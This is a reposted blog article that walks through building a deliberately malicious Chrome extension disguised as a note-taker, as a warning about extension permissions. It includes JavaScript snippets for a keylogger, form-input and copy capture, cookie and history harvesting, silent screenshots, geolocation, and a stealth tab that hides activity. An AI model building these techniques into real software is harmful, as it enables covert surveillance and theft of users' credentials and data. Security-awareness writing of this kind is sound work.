---
title: 关于构建一个窃取一切的 Chrome 插件
data: 2024-03-01T14:15:10+08:00
categories:
  - favorite
tags:
  - favorite
  - webclipper
  - chrome
  - extension
  - steal
origin-link: https://mattfrisbie.substack.com/p/spy-chrome-extension
draft: false
---
Update: this piece was featured on the NBTV YouTube Channel

<iframe src="https://www.youtube-nocookie.com/embed/cIGESSm39n4?rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0" frameborder="0" loading="lazy" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true" width="728" height="409"></iframe>

Manifest v3 may have taken some of the juice out of browser extensions, but I think there is still plenty left in the tank. To prove it, let’s build a Chrome extension that steals as much data as possible. I’m talking kitchen sink, whole enchilada, Grinch-plundering-Whoville levels of data theft.

This will accomplish two things:

-   Explore the edges of what is possible with Chrome extensions

-   Demonstrate what you are exposed to if you aren’t careful with what you install


_Disclaimer: actually implementing this would be evil. You shouldn’t abuse extension permissions, steal user data, or build malicious browser extensions. Any implementation, derivative extension, or utilization of these techniques, without the express written consent of Major League Baseball, is not advised._

## Ground Rules

-   The user shouldn’t be aware that anything is happening behind the scenes.

-   There must be no visual indication that anything is awry.

    -   No extra console messages, warnings, or errors.

    -   No additional browser warning or permission dialogs.

    -   No extra page-level network traffic.

-   Once the user agrees to the _\*ahem\*_ ample permission warnings, that’s the last time they should have to think about the extension’s permissions.


## Chrome Extension Crash Course

If you’re not familiar with the internals of browser extensions, there’s three components that we care about for our evil extension:

**Background Service Worker**

-   Event driven. Can be used as a “persistent” container for running JavaScript

-   Can access all\* of the WebExtensions API

-   Cannot access DOM APIs

-   Cannot directly access pages


**Popup Page**

-   Only opens after user interaction

-   Can access all\* of the WebExtensions API

-   Can access DOM APIs

-   Cannot directly access pages


**Content Script**

-   Has direct and full access to all pages and the DOM

-   Can run JavaScript in page, but in sandboxed runtime

-   Can only use a subset of the WebExtensions API

-   Subject to same restrictions as page (CORS, etc)


_\*Minor restrictions apply, batteries not included_

## Obtaining Global Permissions

Just for fun, our malicious extension will request _all_ possible permissions. [https://developer.chrome.com/docs/extensions/mv3/declare\_permissions/](https://developer.chrome.com/docs/extensions/mv3/declare_permissions/) has a list of Chrome extension permissions, and we’ll take the lot.

After pruning out all permissions that Chrome doesn’t support, we get the following:

```
{
  ...
  "host_permissions": ["&lt;all_urls&gt;"],
  "permissions": [
    "activeTab",
    "alarms",
    "background",
    "bookmarks",
    "browsingData",
    "clipboardRead",
    "clipboardWrite",
    "contentSettings",
    "contextMenus",
    "cookies",
    "debugger",
    "declarativeContent",
    "declarativeNetRequest",
    "declarativeNetRequestWithHostAccess",
    "declarativeNetRequestFeedback",
    "desktopCapture",
    "downloads",
    "fontSettings",
    "gcm",
    "geolocation",
    "history",
    "identity",
    "idle",
    "management",
    "nativeMessaging",
    "notifications",
    "pageCapture",
    "power",
    "printerProvider",
    "privacy",
    "proxy",
    "scripting",
    "search",
    "sessions",
    "storage",
    "system.cpu",
    "system.display",
    "system.memory",
    "system.storage",
    "tabCapture",
    "tabGroups",
    "tabs",
    "tabs",
    "topSites",
    "tts",
    "ttsEngine",
    "unlimitedStorage",
    "webNavigation",
    "webRequest"
  ],
}
```

_manifest.json_

Most of these permissions won’t be needed, but who cares? Let’s see what the warning message looks like:

[

![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png)

](https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png)

Chrome scrolls the permission warning message container, so more than half of the warning messages don’t even show up. I’d bet most users wouldn’t think twice about installing an extension that appears to ask for just 5 permissions.

The **full** permission warning list is as follows:

-   Above the fold:

    -   Access the page debugger backend

    -   Read and change all your data on websites

    -   Detect your physical location

    -   Read and change your browsing history on all your signed-in devices

    -   Display notifications

-   Below the fold:

    -   Read and change your bookmarks

    -   Read and modify data you copy and paste

    -   Capture content of your screen

    -   Manage your downloads

    -   Identify and eject storage devices

    -   Change your settings that websites’ access to features such as cookies, JavaScript, plugins, geolocation, microphone, camera, etc.

    -   Manage your apps, extensions, and themes

    -   Communicate with cooperating native applications

    -   Change your privacy-related settings

    -   View and manage your tab groups

    -   Read all text using spoken synthesized speech


Let’s add in a content script that runs in all pages and frames, extend our extension’s coverage to incognito windows, and make all our resources accessible just in case we need them:

```
<code>{
  ...
  "web_accessible_resources": [
    {
      "resources": ["*"],
      "matches": ["&lt;all_urls&gt;"]
    }
  ],
  "content_scripts": [
    {
      "matches": ["&lt;all_urls&gt;"],
      "all_frames": true,
      "css": [],
      "js": ["content-script.js"],
      "run_at": "document_end"
    }
  ],
  "incognito": "spanning",
}</code>
```

_manifest.json_

## The Extension Facade

Our heinous extension will masquerade as a note-taking app:

[

![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png)

](https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png)

This gives us an extension page that will be opened frequently, allowing us to perform nefarious data collection silently. We’ll also use a background service worker.

## Analytics and Data Exfiltration

Life is short, the internet is fast, and storage is cheap. Any data our extension decides to collect can be sent off to a server we control through the background service worker, and the user will be none the wiser. These network requests will only show up if they decide to inspect the network activity of the extension itself, which is pretty hard to get to.

Want to add invasive user tracking to web pages? No problem! Network traffic from the background page is not subject to ad blockers or other user privacy extensions, so track every click and keystroke to you heart’s content. (External network traffic managers and things like PiHole will still work)

## _Very_ Low Hanging Fruit

Right off the bat, the WebExtensions API lets us collect quite a bit with almost zero effort.

## Cookies

`chrome.cookies.getAll({})` retrieves all the browser’s cookies as an array.

## History

`chrome.history.search({ text: "" })` retrieves the user’s entire browsing history as an array.

## Screenshots

`chrome.tabs.captureVisibleTab()` silently captures a screenshot of whatever the user is currently looking at. We can call this as often as we like with messages sent from the content script - or even more frequently on URLs we deem to be valuable. The API returns the image as nice data URL strings, so it’s trivial to whisk them off to our data collection endpoint.

Are your browser extensions capturing your screen right now? You’ll never know!

## User Navigation

We can use the `webNavigation` API to easily track the user’s browsing activity in real time:

```
chrome.webNavigation.onCompleted.addListener((details) =&gt; {
  // {
  //   "documentId": "F5009EFE5D3C074730E67F5C1D934C0A",
  //   "documentLifecycle": "active",
  //   "frameId": 0,
  //   "frameType": "outermost_frame",
  //   "parentFrameId": -1,
  //   "processId": 139,
  //   "tabId": 174034187,
  //   "timeStamp": 1676958729790.8088,
  //   "url": "https://www.linkedin.com/feed/"
  // }
});
```

_background.js_

## Page Traffic

The `webRequest` API lets us watch all network traffic from every tab, tease out network traffic with a `requestBody`, and extract capturing credentials, addresses, etc:

```
chrome.webRequest.onBeforeRequest.addListener(
  (details) =&gt; {
    if (details.requestBody) {
      // Capture requestBody data
    }
  },
  {
    urls: ["&lt;all_urls&gt;"],
  },
  ["requestBody"]
);
```

_background.js_

## Keylogger

With a content script running on every page, reading keystrokes is dead easy. Creating a keystroke buffer that is periodically flushed will give us nice consecutive keystrokes that are easy to read.

```
let buffer = "";

const debouncedCaptureKeylogBuffer = _.debounce(async () =&gt; {
  if (buffer.length &gt; 0) {
    // Flush the buffer

    buffer = "";
  }
}, 1000);

document.addEventListener("keyup", (e: KeyboardEvent) =&gt; {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});
```

_content-script.js_

## Input Capturing

From the content script, we can just listen for `input` events on any editable elements and capture their value.

```
[...document.querySelectorAll("input,textarea,[contenteditable]")].map((input) =&gt;
  input.addEventListener("input", _.debounce((e) =&gt; {
    // Read input value
  }, 1000))
);
```

_content-script.js_

If we’re expecting the page DOM to change often (for example, with SPAs), we certainly don’t want to miss out on any valuable data. Just set a `MutationObserver` to watch the entire page, and reapply listeners as needed.

```
const inputs: WeakSet&lt;Element&gt; = new WeakSet();

const debouncedHandler = _.debounce(() =&gt; {
  [...document.querySelectorAll("input,textarea,[contenteditable")]
    .filter((input: Element) =&gt; !inputs.has(input))
    .map((input) =&gt; {
      input.addEventListener(
        "input",
        _.debounce((e) =&gt; {
          // Read input value
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() =&gt; debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });
```

_content-script.js_

## Clipboard Capturing

This one is a bit trickier. `navigator.clipboard.read()` or any other Clipboard API methods will prompt the user with a permissions dialog, so these are off-limits.

[

![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png)

](https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png)

Using `document.execCommand("paste")` to dump the clipboard into a hidden input is unreliable, so we’re stuck grabbing the selected text out of the page.

```
document.addEventListener("copy", () =&gt; {
  const selected = window.getSelection()?.toString();

  // Capture selected text on copy events
});
```

_content-script.js_

(Note: I’m not totally satisfied with this, but good enough for now.)

## Capturing Geolocation

Geolocation capturing is the trickiest one due to Chrome’s restrictions on when and how it an be captured. Adding the `geolocation` permission only allows us to capture the location inside _an extension page_, not from content scripts. If the popup is opened frequently enough, this might be sufficient.

```
navigator.geolocation.getCurrentPosition(
  (position) =&gt; {
    // Capture position
  },
  (e) =&gt; {},
  {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0,
  }
);
```

_popup.js_

If we need _more_ geolocation data, we’ll need to do it from a content script. We need to prevent the browser from generating a permission dialog, so first we check if the page already has the geolocation permission. If it does, we can silently request the location.

```
navigator.permissions
  .query({ name: "geolocation" })
  .then(({ state }: { state: string }) =&gt; {
    if (state === "granted") {
      captureGeolocation();
    }
  });
```

_content-script.js_

## Stealth Tab

If you’re anything like me, you have a ton of tabs open. Most tabs sit there idly for long stretches of time, and Chrome eagerly unmounts idle tabs to free up system resources.

Suppose we needed to open an extension page in a tab without the user noticing. Maybe we need to perform some additional page-level processing with the WebExtensions API. Opening and closing a new tab would cause a lot of visual movement in the tab bar, this is too suspicious. Instead, let’s reuse an existing tab and make it _appear_ to be the old tab.

This could work as follows:

1.  Find a candidate tab that the user isn’t paying attention to.

2.  Record its URL, favicon URL, and title.

3.  Replace that tab with our extension page, and immediately replace the favicon and title so it resembles the original tab.

4.  Do bad things.

5.  Once the page finishes, or once the user opens the tab, navigate back to the original URL.


Let’s build a proof of concept. Here’s an example background script to open the stealth tab:

```
export async function openStealthTab() {
  const tabs = await chrome.tabs.query({
    // Don't use the tab the user is looking at
    active: false,
    // Don't use pinned tabs, they're probably used frequently
    pinned: false,
    // Don't use a tab generating audio
    audible: false,
    // Don't use a tab until it is finished loading
    status: "complete",
  });

  const [eligibleTab] = tabs.filter((tab) =&gt; {
    // Must have url and id
    if (!tab.id || !tab.url) {
      return false;
    }

    // Don't use extension pages
    if (new URL(tab.url).protocol === "chrome-extension:") {
      return false;
    }

    return true;
  });

  if (eligibleTab) {
    // These values will be used to spoof the current page
    // and navigate back
    const searchParams = new URLSearchParams({
      returnUrl: eligibleTab.url as string,
      faviconUrl: eligibleTab.favIconUrl || "",
      title: eligibleTab.title || "",
    });

    const url = `${chrome.runtime.getURL(
      "stealth-tab.html"
    )}?${searchParams.toString()}`;

    // Open the stealth tab
    await chrome.tabs.update(eligibleTab.id, {
      url,
      active: false,
    });
  }
}
```

_background.js_

And here’s our stealth tab script:

```

const searchParams = new URL(window.location.href).searchParams;

// Spoof the previous page tab appearance
document.title = searchParams.get('title);
document.querySelector(`link[rel="icon"]`)
  .setAttribute("href", searchParams.get('faviconUrl'));

function useReturnUrl() {
  // User focused this tab, flee!
  window.location.href = searchParams.get('returnUrl');
}

// Check to see if this page is visible on load
if (document.visibilityState === "visible") {
  useReturnUrl();
}

document.addEventListener("visibilitychange", () =&gt; useReturnUrl());

// Now do bad things

// Done doing bad things, return!
useReturnUrl();
```

_stealth-tab.js_

[

![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png)

](https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png)

Nothing suspicious here!

## Publishing to the Chrome Web Store

I’m kidding, of course. This extension would be laughed out of the review queue.

This extension is obviously a caricature of a malicious extension, but is it so crazy to think that a subset of this behavior could be used? When installing a Chrome extension that _seems_ trustworthy (whatever that means), most users will ignore the permissions warning messages no matter how scary they are. Once you accept the permissions, you are at the extension’s mercy.

You might be thinking “Matt, surely this doesn’t apply to me! I’m a savvy tech guru who is careful, fastidious, and obsequious. Nobody could ever pull one over on me.”

In that case, my obsequious friend, answer these questions:

-   Without looking, can you name more than half of the extensions you have installed right now?

-   Who maintains them? Is it the same entity that maintained it when you first installed? Are you sure?

-   Did you _really_ scrutinize their permissions?


## Try it out if you dare

You can test out the Spy Extension here: [https://github.com/msfrisbie/spy-extension](https://github.com/msfrisbie/spy-extension)

I’ve added an options page so you can see all the plundered data the extension is able to suck out of your browser. I’m not going to post a screenshot; suffice to say, the contents of the page are a _tiny_ bit compromising.

Nothing collected leaves your browser. Or does it? (No, it doesn’t)

_Matt Frisbie is the author of [Building Browser Extensions](https://www.buildingbrowserextensions.com/)_

_You can reach me at [mattfriz.com](https://www.mattfriz.com/)_

[

![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png)

](https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png)
